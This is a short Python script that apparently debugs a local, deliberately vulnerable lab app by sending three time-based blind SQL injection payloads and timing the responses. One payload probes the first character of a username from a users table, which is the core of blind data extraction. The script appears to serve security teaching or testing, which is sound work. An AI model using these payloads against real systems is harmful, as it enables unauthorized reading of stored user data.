#!/usr/bin/env python3
"""Test script to debug lab app condition parsing."""

import requests
import time

url = "http://127.0.0.1:5000/vulnerable"

# Test 1: False condition (should not delay)
print("Test 1: False condition (1=0) - should be fast")
payload1 = "1 OR (1=0) AND SLEEP(2) -- -"
start = time.time()
r = requests.get(url, params={'id': payload1})
elapsed1 = time.time() - start
print(f"  Time: {elapsed1:.3f}s")
print(f"  Response: {r.json()}")
print()

# Test 2: True condition (should delay ~2s)
print("Test 2: True condition (1=1) - should delay ~2s")
payload2 = "1 OR (1=1) AND SLEEP(2) -- -"
start = time.time()
r = requests.get(url, params={'id': payload2})
elapsed2 = time.time() - start
print(f"  Time: {elapsed2:.3f}s")
print(f"  Response: {r.json()}")
print()

# Test 3: Complex condition
print("Test 3: Complex condition - ASCII check")
payload3 = "1 OR (ASCII(SUBSTRING((SELECT username FROM users WHERE 1=1 LIMIT 1), 1, 1)) >= 64) AND SLEEP(2) -- -"
start = time.time()
r = requests.get(url, params={'id': payload3})
elapsed3 = time.time() - start
print(f"  Time: {elapsed3:.3f}s")
print(f"  Response: {r.json()}")
print()

print("Summary:")
print(f"  Test 1 (false): {elapsed1:.3f}s - should be < 0.1s")
print(f"  Test 2 (true):  {elapsed2:.3f}s - should be ~2.0s")
print(f"  Test 3 (complex): {elapsed3:.3f}s - should be ~2.0s if condition is true")

